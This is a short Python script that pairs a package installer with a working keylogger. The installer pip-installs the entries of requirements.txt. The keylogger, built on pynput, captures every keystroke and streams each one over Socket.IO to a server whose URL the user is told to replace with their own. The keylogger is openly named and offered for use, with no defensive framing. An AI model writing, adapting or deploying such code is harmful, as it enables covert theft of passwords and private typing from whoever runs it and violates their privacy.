import os
import sys
import subprocess
import socketio
from pynput.keyboard import Listener

sio = socketio.Client()

class PackageManager:
    def __init__(self):
        self.add_python_to_path()

    def add_python_to_path(self):
        python_dir = sys.exec_prefix

        if python_dir not in os.environ['PATH']:
            os.environ['PATH'] = python_dir + os.pathsep + os.environ['PATH']
            print(f"Python {sys.version} has been added to the PATH for this session.")
        else:
            print(f"Python {sys.version} is already in the PATH.")

    def install_packages_from_file(self, file_path):
        with open(file_path, 'r') as package_file:
            packages_to_install = package_file.read().splitlines()

        for package in packages_to_install:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"Successfully installed {package}.")
            except subprocess.CalledProcessError:
                print(f"Failed to install {package}.")

class Keylogger:
    def __init__(self, server_url):
        self.server_url = server_url

    def on_key_press(self, key):
        try:
            sio.emit('keypress', str(key))
        except Exception as e:
            print(f"Error sending key data to the server: {str(e)}")

    def start_logging(self):
        with Listener(on_press=self.on_key_press) as listener:
            listener.join()

if __name__ == "__main__":
    package_manager = PackageManager()

    # Specify the path to the packages file
    packages_file_path = "requirements.txt"

    package_manager.install_packages_from_file(packages_file_path)

    # Specify the server URL for Socket.IO
    server_url = "http://127.0.0.1:5000"  # Replace with your actual server URL

    keylogger = Keylogger(server_url)

    sio.connect(server_url)

    keylogger.start_logging()

    sio.wait()
